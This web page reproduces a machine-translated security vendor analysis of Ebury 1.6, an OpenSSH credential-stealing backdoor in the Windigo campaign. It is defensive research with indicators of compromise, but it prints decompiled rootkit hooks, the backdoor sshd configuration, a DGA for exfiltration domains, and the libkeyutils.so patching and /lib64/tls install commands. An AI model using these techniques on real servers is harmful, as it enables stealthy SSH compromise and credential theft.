<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Operation Windigo: Linux / Ebury Update</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In February 2014, the ESET Virus Lab introduced a study of OpenSSH backdoor and Linux / Ebury malware to steal credentials. Further research has shown...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Operation Windigo: Linux / Ebury Update</h1><div class="post__text post__text-html js-mediator-article">  In February 2014, the ESET Virus Lab introduced a <a href="https://habrahabr.ru/company/eset/blog/214733/">study of</a> OpenSSH backdoor and Linux / Ebury malware to steal credentials.  Further research has shown that this component is the core of a collection of several families of malicious programs involved in ‚ÄúOperation Windigo‚Äù.  The discovery formed the basis of a <a href="https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf">report</a> describing this cyber campaign. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/er/ms/su/ermssuwkz5klf83w9dndjplucos.jpeg"></div><br>  In February 2017, we found a sample of Ebury with support for new features.  The new version number is 1.6.2a.  At the time of the discovery of this sample, the last version known to us was 1.5.x, revealed a few months earlier.  In the course of further investigation, we realized that the infrastructure responsible for the theft of credentials is still functioning, and Ebury is actively used by the Windigo cybergroup. <br><br>  Initially, we listed the indicators of compromise (IoC) for version 1.4 of Ebury.  CERT-Bund has published IoC for version 1.5.  This post presents a technical analysis of version 1.6, opened in February 2017, as well as IoC for versions 1.5 and 1.6. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <a name="habracut"></a><h3>  New DGA for backup exfiltration </h3><br>  Ebury v1.4 provides a backup mechanism based on the Domain Generation Algorithm (DGA), which is used when an attacker does not connect to the infected system via the OpenSSH backdoor for three days.  Under these conditions, Ebury transfers the collected data using the generated domain.  Ebury v1.6 has the same mechanism, but there are some minor changes in the DGA itself.  In these two versions, only the constants differ, as shown below. <br><br>  <i>New Ebury v1.6 implementation in Python:</i> <br><br><pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">DGA</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(domain_no)</span></span></span><span class="hljs-function">:</span></span> TLDS = [ <span class="hljs-string"><span class="hljs-string">'info'</span></span>, <span class="hljs-string"><span class="hljs-string">'net'</span></span>, <span class="hljs-string"><span class="hljs-string">'biz'</span></span> ] KEY = <span class="hljs-string"><span class="hljs-string">"fmqzdnvcyelwaibsrxtpkhjguo"</span></span> h = <span class="hljs-string"><span class="hljs-string">"%x"</span></span> % ((domain_no * domain_no + <span class="hljs-number"><span class="hljs-number">3807225</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xFFFFFFFF</span></span>) g = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(h))[::<span class="hljs-number"><span class="hljs-number">-1</span></span>]: g += KEY[((ords(h[i]) * <span class="hljs-number"><span class="hljs-number">3579</span></span>) + (ords(h[<span class="hljs-number"><span class="hljs-number">-1</span></span>]) + i + domain_no)) % len(KEY)] g += h[i] g += KEY[((ords(h[<span class="hljs-number"><span class="hljs-number">-1</span></span>]) * <span class="hljs-number"><span class="hljs-number">5612</span></span>) + (len(h) + domain_no - <span class="hljs-number"><span class="hljs-number">1</span></span>)) % len(KEY)] g += <span class="hljs-string"><span class="hljs-string">'.%s'</span></span> % TLDS[domain_no % len(TLDS)] <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> g</code> </pre> <br>  <i>Differences between DGA in versions 1.4 and 1.6 in Python:</i> <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">@@ -1,10 +1,10 @@ def DGA(domain_no): KEY = "fmqzdnvcyelwaibsrxtpkhjguo" - h = "%x" % ((domain_no * domain_no + 4091073) &amp; 0xFFFFFFFF) + h = "%x" % ((domain_no * domain_no + 3807225) &amp; 0xFFFFFFFF) g = "" for i in range(len(h))[::-1]: - g += KEY[((ords(h[i]) * 4906) + (ords(h[-1]) + i + domain_no)) % len(KEY)] + g += KEY[((ords(h[i]) * 3579) + (ords(h[-1]) + i + domain_no)) % len(KEY)] g += h[i] - g += KEY[((ords(h[-1]) * 6816) + (len(h) + domain_no - 1)) % len(KEY)] + g += KEY[((ords(h[-1]) * 5612) + (len(h) + domain_no - 1)) % len(KEY)] g += '.%s' % TLDS[domain_no % len(TLDS)] return g</span></span></code> </pre> <br>  <i>The first ten domains generated by the DGA are:</i> <br><br> <code>larfj7g1vaz3y.net <br> idkff7m1lac3g.biz <br> u2s0k8d1ial3r.info <br> h9g0q8a1hat3s.net <br> f2y1j8v1saa3t.biz <br> xdc1h8n1baw3m.info <br> raj2p8z1aae3b.net <br> o9f3v8r1oaj3p.biz <br> tav4h8n1baw3r.info <br> hdm5o8e1tas3n.net</code> <br> <br>  Ebury consistently tries the generated domain names until it finds one that has a TXT record made by the operator.  To verify the domain owner, Ebury checks whether the TXT record can be decrypted using the RSA public key embedded in its code. <br><br>  <i>DNS record for larfj7g1vaz3y [.] Net:</i> <br> <code>-----BEGIN RSA PUBLIC KEY----- <br> MIGJAoGBAOadSGBGG9x/f1/U6KdwxfGzqSj5Bcy4aZpKv77uN4xYdS5HWmEub5Rj <br> nAvtKybupWb3AUWwN7UPIO+2R+v6hrF+Gh2apcs9I9G7VEBiToi2B6BiZ3Ly68kj <br> 1ojemjtrG+g//Ckw/osESWweSWY4nJFKa5QJzT39ErUZim2FPDmvAgMBAAE= <br> -----END RSA PUBLIC KEY-----</code> <br> <br> <code>larfj7g1vaz3y.net. 1737 IN A 78.140.134.7 <br> larfj7g1vaz3y.net. 285 IN TXT "ItTFyJ6tegXn9HkHa+XZX1+fZw0IsfhXl05phu1F7ZXDP4HtKMvrXW8NbUSjY8vkQgDdKsSaSCyrvfkhHodhVQLhIKJJY64HeoInb3m4SCNZNOhx9qjYRnuR0Ci7BHNWakJC/QdoQ4UNKkOrvvb42kN7TU6jqZCYBtusXd37tNg="</code> <br> <br>  The domain A-record is ignored by Ebury. <br><br>  The decrypted information consists of three CSV-fields.  Here is a sample of the data stored in the DNS records for larfj7g1vaz3y [.] Net for January 2018: <br><br> <code>larfj7g1vaz3y[.]net:3328801113:1504126800</code> <br> <br>  The first field contains the domain name, so that the signed data cannot be reused for another domain.  The second field is the IP address of the C &amp; C server.  The third field contains the UNIX timestamp used as the expiration date of the signed data.  The expiration date is a new field added to bypass the sinkhole method, starting with version 1.6.  If someone tries to seize the domain and IP address of the server to which the stolen data is sent (exfiltration server), the signed data can only be used for a limited period of time.  This will reduce the impact of successful synchronization attempts in almost all previous versions of DGA. <br><br><img src="https://habrastorage.org/webt/ze/w_/ev/zew_evbhbismf1dgwlhfls8oado.png"><br>  <i>Table 1. Decoded information stored in a TXT record</i> <br><br>  We do not think that Ebury operators actually expected to use the backup channel.  In the studied samples, we found many bugs, due to which the mechanism could not be executed.  The code is clearly not fully tested.  For this reason, we can assume that Ebury operators rarely lose access to infected machines.  Probably they are not worried about losing a few - many systems are under their control.  Why so much effort has been made to implement the non-working mechanism is unknown. <br><br>  <b>Review of changes</b> <br>  - slightly modified DGA (modified constants) <br>  - Added expiration date to check the DNS record of the data collection server <br>  - New registered domain: larfj7g1vaz3y [.] Net <br>  - The new IP address of the server to which the stolen data is sent: 198 [.] 105.121.89 <br><br><h3>  New features </h3><br>  New features have been added in version 1.6.  For unknown reasons, they are not available in all studied samples of this version. <br><br>  Ebury now uses self-masking techniques, commonly described as <a href="https://en.wikipedia.org/wiki/Rootkit%2523User_mode">‚Äú</a> user-mode <a href="https://en.wikipedia.org/wiki/Rootkit%2523User_mode">rootkit‚Äù</a> .  To do this, the program intercepts the <code>readdir</code> or <code>readdir64</code> , each of which is used to compile a list of directory entries.  If the next directory structure returned is an Ebury shared library file, then the trap skips it and returns the following entry instead. <br><br>  <i>The result of the readdir trap output in the Hex-Rays decompiler:</i> <br><br> <code>struct dirent *__fastcall readdir(__int64 a1) <br> { <br> struct dirent *dir_entry; // rax <br> struct dirent *dir_entry_1; // rbx <br> __ino_t inode; // rax <br> <br> do <br> { <br> if ( !readdir_0 ) <br> readdir_0 = F_resolve_func("readdir"); <br> dir_entry = readdir_0(a1); <br> dir_entry_1 = dir_entry; <br> if ( !exports_hook_activated ) <br> break; <br> if ( !dir_entry ) <br> break; <br> if ( !ebury_inode ) <br> break; <br> inode = dir_entry-&gt;d_ino; <br> if ( inode != ebury_inode &amp;&amp; inode != ebury_lstat_inode ) <br> break; <br> } <br> while ( ebury_filename &amp;&amp; !strncmp(dir_entry_1-&gt;d_name, ebury_filename, <br> ebury_filename_len_before_extension) ); <br> return dir_entry_1; <br> }</code> <br> <br>  Ebury trap activation is done by injecting a dynamic library into each <code>sshd</code> descendant process.  To embed itself in subprocesses, Ebury intercepts <code>execve</code> and uses the linker dynamic variable <code>LD_PRELOAD</code> .  Each time a new process is created, Ebury adds <code>LD_PRELOAD=&lt;Ebury_filename&gt;</code> to its environment. <br><br>  An <a href="https://srvfail.com/check-clean-ebury-ssh-rootkit/">article</a> on srvfail.com mentions a <a href="http://archive.is/XvoWM">thread</a> on StackExchange of a user whose machine was allegedly compromised by Ebury.  The behavior he describes is consistent with the self-escalation techniques that we observed in Ebury version 1.6.2a. <br><br>  Early versions of Ebury worked on certain versions of OpenSSH and depended on the Linux distribution.  Now it is not.  Most of the practices of applying OpenSSH patches have been replaced by traps functions.  We tried installing Ebury on machines under Debian Jessie, CentOS 7 and Ubuntu Artful using the same sample, and it worked in all cases. <br><br>  For injecting the OpenSSH server configuration directly into the Ebury memory, the sshd binary code is parsed, which is displayed in the same process, looking for two different functions.  He is trying to find the address <code>parse_server_config</code> or <code>process_server_config_line</code> .  If the attempt fails, it lowers the security properties by turning off the SELinux Role-Based Access Control and turning off the PAM modules.  When one of the functions has been successfully processed, Ebury uses it during the <code>sshd</code> configuration change when using the backdoor. <br><br>  <i>Backdoor configuration:</i> <br><br> <code>PrintLastLog no <br> PrintMotd no <br> PasswordAuthentication no <br> PermitRootLogin yes <br> UseLogin no <br> UsePAM no <br> UseDNS no <br> ChallengeResponseAuthentication no <br> LogLevel QUIET <br> StrictModes no <br> PubkeyAuthentication yes <br> AllowUsers n <br> AllowGroups n <br> DenyUsers n <br> DenyGroups n <br> AuthorizedKeysFile /proc/self/environ <br> Banner /dev/null <br> PermitTunnel yes <br> AllowTcpForwarding yes <br> PermitOpen any</code> <br> <br>  Ebury authors also strengthened the backdoor mechanism.  Instead of relying on the password encoded in the SSH client version string, activating the backdoor now requires a personal key for authentication.  Perhaps this additional check was added to prevent those who can find the backdoor password from accessing the compromised Ebury server. <br><br>  <i>Ebury Operators RSA Public Key:</i> <br> <code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESH <br> CvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2ygjzXd3BD+ADXDurAlDG <br> bh0NsyCJDFCQ8Bsrwl7p5ZEPEfBOh99IBMbAOgqVmM9tTv7ci05yoBEEcFsNaBg00 <br> H+m0GooLsNsl+5TG3a2aUg6Dg2CKfi55HHTHC/9rqoAdv7Gbc5Y7W8xrNIjOIuxDx <br> Bx353bKO0uSuL06m2Q4m8kYlaw51ZWVylIhGOPm4ldqP4Jjls8QtL/Eg2ZD7epUq6 <br> 3E/xqI4tMEQl9BmW1Df5+LjbVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub</code> <br> <br>  When trying to connect to the Ebury backdoor, it changes the <code>AuthorizedKeysFile</code> option to point to <code>/proc/self/environ</code> .  It intercepts <code>open</code> or <code>open64</code> and checks whether there is an attempt to open <code>/proc/self/environ</code> or paths containing <code>.ssh/authorized_keys</code> .  The second check can be used as a backup if Ebury cannot <code>parse_server_config</code> and <code>process_server_config_line</code> to force the transfer of its configuration.  Ebury also hooks <code>fgets</code> , which <code>sshd</code> calls to read the contents of the authorized_keys file.  The global variable is used to ensure that <code>fgets</code> is called after opening the authorized_keys file.  Then the trap fills the <code>fgets</code> buffer with the public key of Ebury statements, so the attackers key is used for authentication. <br><br>  <i>The output of the fgets trap output in the Hex-Rays decompiler:</i> <br><br> <code>char *__fastcall fgets_hook(char *s, __int64 size, FILE *stream) <br> { <br> int fd_env; // ebp <br> char *result; // rax <br> <br> if ( !(backdoor_command &amp; 1) ) <br> return fgets_0(s); <br> fd_env = fd_proc_self_environ; <br> if ( fd_proc_self_environ &lt;= 0 || fd_env != fileno(stream) ) <br> return fgets_0(s); <br> strcpy( <br> s, <br> "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESHCvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2ygjzXd" "3BD+ADXDurAlDGbh0NsyCJDFCQ8Bsrwl7p5ZEPEfBOh99IBMbAOgqVmM9tTv7ci05yoBEEcFsNaBg00H+m0GooLsNsl+5TG3a2aUg6Dg2CKfi55HHTHC" "/9rqoAdv7Gbc5Y7W8xrNIjOIuxDxBx353bKO0uSuL06m2Q4m8kYlaw51ZWVylIhGOPm4ldqP4Jjls8QtL/Eg2ZD7epUq63E/xqI4tMEQl9BmW1Df5+Lj" <br> "bVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub\n"); <br> result = s; <br> fd_proc_self_environ = 0; <br> return result; <br> }</code> <br> <br>  The purpose of the interception trap of the memory copy function ( <code>memcpy</code> ) has not yet been established. <br><br>  <i>The output of the memcpy trap output in the Hex-Rays decompiler:</i> <br><br> <code>char *__fastcall memcpy_hook(char *dst, const char *src, size_t len) <br> { <br> size_t len_1; // r12 <br> char *result; // rax <br> <br> len_1 = len; <br> memcpy_orig(dst, src, len); <br> if ( len_1 &gt; 0x1F &amp;&amp; !strncmp(src, "chacha20-poly1305@openssh.com,", 0x1EuLL) ) <br> result = memcpy_orig(dst, src + 30, len_1 - 30); <br> else <br> result = dst; <br> return result; <br> }</code> <br> <br>  We know that the trap is used to remove the chacha20-poly1305 algorithm during the SSH key exchange.  It is strange that the authors of Ebury do not want this algorithm to be used. <br><br><h3>  New installation methods </h3><br>  Ebury used to add payloads to <code>libkeyutils.so</code> .  The file contained both the legitimate functions of libkeyutils, and the malicious code Ebury, run at boot.  In the case of an infection, the file size was larger than usual - we pointed this out as a sign of compromise back in 2014. <br><br>  We observed how this method was used in version 1.6.2, while the authors of Ebury came up with new ways to circumvent our indicators of compromise.  They still use the file <code>libkeyutils.so</code> , but otherwise. <br><br>  Based on our observations, the scripts and deployment methods differ depending on the Linux distribution of the system being attacked. <br><br>  <b>Debian / Ubuntu</b> <br><br>  On Debian / Ubuntu systems, Ebury is being implemented using a new method.  Since <code>libkeyutils.so</code> loaded by the OpenSSH client and OpenSSH server executables, it remains an interesting target for attackers.  Earlier, we noticed that Ebury was installed by changing the symbolic link <code>libkeyutils.so.1</code> to indicate the malicious version of the library.  The modified library has a constructor where the initialization code Ebury is stored.  Each time <code>libkeyutils.so</code> is loaded, a <code>libkeyutils.so</code> is called.  Thus, each time the OpenSSH client or server starts, Ebury is injected into the process. <br><br>  The latest deployment method on Debian / Ubuntu is now based on the <code>libkeyutils.so</code> patch, to get it to load Ebury, stored in a separate <code>.so</code> file.  Comparing the original and patched versions, we found that in the <code>.dynamic</code> section of the ELF file header there is an additional entry.  The entry has the type NEEDED (0x01), which means the dependence of the executable file and that it is loaded in the process.  In the deployment script that we studied, the loadable library is called <code>libsbr.so</code> and contains the malicious code Ebury. <br><br>  <i>The difference between the dynamic sections of the original and patched libkeyutils.so:</i> <br> <code>--- ./libkeyutils.so.1-5 2017-10-13 21:19:24.269521814 -0400 <br> +++ ./libkeyutils.so.1-5.patched 2017-10-13 21:19:17.405092274 -0400 <br> @@ -1,5 +1,5 @@ <br> <br> -Dynamic section at offset 0x2cf8 contains 26 entries: <br> +Dynamic section at offset 0x2cf8 contains 27 entries: <br> Tag Type Name/Value <br> 0x0000000000000001 (NEEDED) Shared library: [libc.so.6] <br> 0x000000000000000e (SONAME) Library soname: [libkeyutils.so.1] <br> @@ -26,4 +26,5 @@ <br> 0x000000006fffffff (VERNEEDNUM) 1 <br> 0x000000006ffffff0 (VERSYM) 0xdf0 <br> 0x000000006ffffff9 (RELACOUNT) 3 <br> + 0x0000000000000001 (NEEDED) Shared library: [libsbr.so] <br> 0x0000000000000000 (NULL) 0x0</code> <br> <br>  The process of applying the patch consists of two steps.  First, the string ‚Äú <code>libsbr.so</code> ‚Äù must be placed in the string table of a binary file.  Secondly, a new entry of type 0x1 (DT_NEEDED) needs to be added to the dynamic section of the ELF file headers.  Ebury authors replaced the string " <code>__bss_start</code> " with " <code>_\x00libsbr.so</code> ".  Since <code>__bss_start</code> not used by the dynamic linker, changing this symbol does not affect the execution of the library.  The figure below shows the differences between the original and modified row tables <code>libkeyutils.so</code> . <br><br><img src="https://habrastorage.org/webt/pi/8-/uj/pi8-ujjiktdpqbxlx-cvscy4cho.png"><br>  <i>Figure 1. Differences between original and patched row tables</i> <br><br>  Now, when the string <code>libsbr.so</code> is stored in the string table, you need to add a new entry to the <code>.dynamic</code> section.  Figure 2 shows the differences between the original and patched libkeyutils.so sections .dynamic. <br><br><img src="https://habrastorage.org/webt/ru/ta/pk/rutapkodvhtbb8u2z8im17ex_am.png"><br>  <i>Figure 2. Differences between the original and patched sections of the .dynamic libkeyutils.so</i> <br><br>  The <code>.dynamic</code> section contains an Elf64_Dyn array for the amd64 binary files and Elf64_Dyn for the i386.  The definitions of these structures are presented below. <br><br>  <i>Structures associated with the .dynamic section</i> <br> <code>typedef struct { <br> Elf32_Sword d_tag; <br> union { <br> Elf32_Word d_val; <br> Elf32_Addr d_ptr; <br> } d_un; <br> } Elf32_Dyn; <br> <br> typedef struct { <br> Elf64_Sxword d_tag; <br> union { <br> Elf64_Xword d_val; <br> Elf64_Addr d_ptr; <br> } d_un; <br> } Elf64_Dyn;</code> <br> <br>  Below are 64-bit versions of <code>libkeyutils.so</code> .  Thus, new entries in the .dynamic section can be written as follows. <br><br>  <i>New entry in .dynamic:</i> <br> <code>Elf64_Dyn dyn; <br> dyn.d_tag = DT_NEEDED; <br> dyn.d_val = 0x38F;</code> <br> <br>  For greater secrecy, Ebury operators took care to patch the MD5 sums of the <code>libkeyutils1</code> package.  Check the system for infection using a simple check the integrity of the package, it is impossible.  This command will not show the presence of errors. <br><br>  The package integrity check command: <code>$ dpkg --verify libkeyutils1</code> <br><br>  When deployed as a separate library, Ebury uses many file names.  Below is a list of known file names: <br>  - libns2.so <br>  - libns5.so <br>  - libpw3.so <br>  - libpw5.so <br>  - libsbr.so <br>  - libslr.so <br><br>  <b>CentOS</b> <br><br>  Techniques similar to those used for deployment on Debian / Ubuntu are also used for CentOS.  Attackers put a patch on <code>libkeyutils.so.1</code> to force the loading of an additional library.  In addition, we noticed a new technique used to introduce Ebury into systems under CentOS / RedHat.  We do not yet know all the details of the installation process, but viewing some of the online reports has made some assumptions about how the implementation takes place. <br><br>  We know that Ebury is implemented as a separate shared object by the <code>libkeyutils</code> file, in a manner similar to Debian.  We also observed another installation method, which is supposedly the implementation method in version 1.6.  As in previous versions of Ebury, the operators created their own version of <code>libkeyutils.so</code> , to which they added a constructor containing malicious code.  Instead of changing <code>libkeyutils.so.1</code> from <code>/lib/</code> or <code>/lib64/</code> they place their files in the <code>/lib{,64}/tls/</code> , as the dynamic linker starts processing dependencies from this directory. <br><br>  We believe that the process of implementing this version begins with the location of Ebury in the folder <code>/lib/tls/</code> or <code>/lib64/tls/</code> , depending on the architecture of the victim‚Äôs system.  Then launching <code>ldconfig</code> automatically creates a symbolic link / <code>/lib{,64}/tls/libkeyutils.so.1</code> , <code>/lib{,64}/tls/libkeyutils.so.1</code> , indicating a malicious shared object. <br><br>  <i>Using ldconfig to embed Ebury in / lib64 / tls /:</i> <br><br> <code>[root@c2093ca76055 lib64]# ldd /usr/bin/ssh | grep -i libkeyutils <br> libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007ff67774f000) <br> [root@c2093ca76055 lib64]# cp libkeyutils.so.1.5 /lib64/tls/ <br> [root@c2093ca76055 lib64]# ldd /usr/bin/ssh | grep -i libkeyutils <br> libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007f44ac6ba000) <br> [root@c2093ca76055 lib64]# ldconfig <br> [root@c2093ca76055 lib64]# ldd /usr/bin/ssh | grep -i libkeyutils <br> libkeyutils.so.1 =&gt; /lib64/tls/libkeyutils.so.1 (0x00007fc12db23000) <br> [root@c2093ca76055 lib64]# ls -al /lib64/tls <br> total 24 <br> dr-xr-xr-x 1 root root 4096 Oct 18 14:34 . <br> dr-xr-xr-x 1 root root 4096 Oct 18 13:25 .. <br> lrwxrwxrwx 1 root root 18 Oct 18 14:34 libkeyutils.so.1 -&gt; libkeyutils.so.1.5 <br> -rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5</code> <br> <br>  In addition, this is done for a simple uninstall system, which does not require manipulation of symbolic links and storing backup copies of the original shared <code>libkeyutils</code> object if something goes wrong during the deployment.  Simply delete the malicious file <code>libkeyutils.so</code> in the folder <code>/lib{,64}/tls/</code> and then run <code>ldconfig</code> again so that the system returns to its original state. <br><br>  <i>Apply ldconfig to remove Ebury:</i> <br><br> <code>[root@c2093ca76055 tls]# pwd <br> /lib64/tls <br> [root@c2093ca76055 tls]# ls -l <br> total 16 <br> lrwxrwxrwx 1 root root 18 Oct 18 14:34 libkeyutils.so.1 -&gt; libkeyutils.so.1.5 <br> -rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5 <br> [root@c2093ca76055 tls]# rm libkeyutils.so.1.5 <br> [root@c2093ca76055 tls]# ldconfig <br> [root@c2093ca76055 tls]# ls -l <br> total 0 <br> [root@c2093ca76055 tls]# ldd /usr/bin/ssh | grep -i libkeyutils <br> libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007f7b89349000) <br> [root@c2093ca76055 tls]# ls -l /lib64/libkeyutils.so.1 <br> lrwxrwxrwx 1 root root 18 Oct 18 13:25 /lib64/libkeyutils.so.1 -&gt; libkeyutils.so.1.5</code> <br> <br>  The <code>tls</code> used in conjunction with the Linux boot loader function.  Due to this, if the CPU supports an additional set of commands, the command located in this directory receives a higher priority than the ‚Äúnormal‚Äù one. <br><br><h3>  Conclusion </h3><br>  Despite the <a href="https://habrahabr.ru/company/eset/blog/325338/">arrest of</a> Maxim Senah, the Windigo botnet continues to work.  Ebury, the main component of the Linux botnet, has acquired a number of significant improvements.  Now he uses self-masking techniques and new ways of injecting into OpenSSH related processes.  In addition, it uses a new domain generation algorithm (DGA) to search for a valid TXT domain record, signed by the attacker's private key - the address of the IP collection server is hidden in it.  An expiration date has been added to prevent the reuse of signed data, which helps prevent syncholding attempts.  Windigo operators regularly review published indicators of compromise and adapt software to avoid detection.  This should be taken into account when trying to determine the infection of a system using well-known IoCs - the earlier they are published, the more likely it is that they are already outdated. <br><br><h3>  Indicators of compromise </h3><br>  In this section, we publish our indicators of compromise, which can help identify the latest versions of Ebury.  We provide them to help the community determine the infection of their systems, but we do not claim to be perfect. <br><br>  Ebury now uses a UNIX socket to communicate with an external process responsible for data theft.  In most cases, the socket name starts with " <code>/tmp/dbus-</code> ".  A real <code>dbus</code> can create a socket in a similar way.  However, Ebury does this through non-legitimate <code>dbus</code> processes.  If the result of the following command is a socket, it is suspicious: <br><br> <code>$ lsof -U | grep -F @/tmp/dbus- | grep -v ^dbus</code> <br> <br>  Below is a list of processes that we know Ebury uses for data leakage: <br>  - auditd <br>  - crond <br>  - anacron <br>  - arpd <br>  - acpid <br>  - rsyslogd <br>  - udevd <br>  - systemd-udevd <br>  - atd <br>  - hostname <br>  - sync <br><br>  On CentOS / Redhat, the presence of the file <code>libkeyutils.so*</code> in <code>/lib/tls/</code> or <code>/lib64/tls/</code> . <br><br>  Running <code>objdump -x libkeyutils.so.1</code> (or <code>readelf -d libkeyutils.so.1</code> ) displays the dynamic section of the ELF file header.  Anything with a NEEDED tag (type 1) besides libc or libdl looks suspicious. <br><br> <code>$ objdump -x /lib64/libkeyutils.so.1 | grep NEEDED | grep -v -F -e libdl.so -e libc.so</code> <br> <br>  If your machine is infected with an Ebury version with a user-space rootkit, there are many ways to determine this.  Ebury injects itself using the <code>LD_PRELOAD</code> dynamic linker system variable, so we can use another system variable to detect the dynamic linker process.  If <code>libkeyutils</code> loaded into any process where it should not be, most likely the system is infected with the Ebury version with the rootkit turned on.  If the following command returns a result, it is also suspicious: <br><br> <code><code>$ LD_DEBUG=symbols /bin/true 2&gt;&amp;1| grep libkeyutils</code></code> <br> <br>  If you identify an infected machine, we recommend that you <b>completely reinstall the system</b> , because Windigo sometimes installs additional malware.  A machine compromised by Ebury may be infected with another malware.  In addition, assume that all user credentials and SSH keys are compromised - <b>change them all</b> . <br><br><img src="https://habrastorage.org/webt/8h/fd/jr/8hfdjrhkchwt2nq_uvh65z_y2bs.png"><br>  <i>Table 2. Ebury related hashes</i> </div><p>Source: <a href="https://habr.com/ru/post/342392/">https://habr.com/ru/post/342392/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../342382/index.html">Raiffeisen-Online Short-Lynch</a></li>
<li><a href="../342384/index.html">Kotlin Night Moscow in Avito on November 25</a></li>
<li><a href="../342386/index.html">Build your Security Operation Center of 5 items</a></li>
<li><a href="../342388/index.html">Colorize a black and white photo using a neural network of 100 lines of code</a></li>
<li><a href="../342390/index.html">Russia vs Germany. Inside about the processes of those. support, quality service and Russian hackers</a></li>
<li><a href="../342394/index.html">Additional reports and processing, use of extensions in 1C Fresh</a></li>
<li><a href="../342398/index.html">Live broadcast of the press conference with the presentation of the startup ROI4CIO</a></li>
<li><a href="../342400/index.html">Targeting the Odnoklassniki Moderator application</a></li>
<li><a href="../342402/index.html">Web application on Node and Vue, part 4: code reuse</a></li>
<li><a href="../342404/index.html">Javascript: the path to code clarity</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
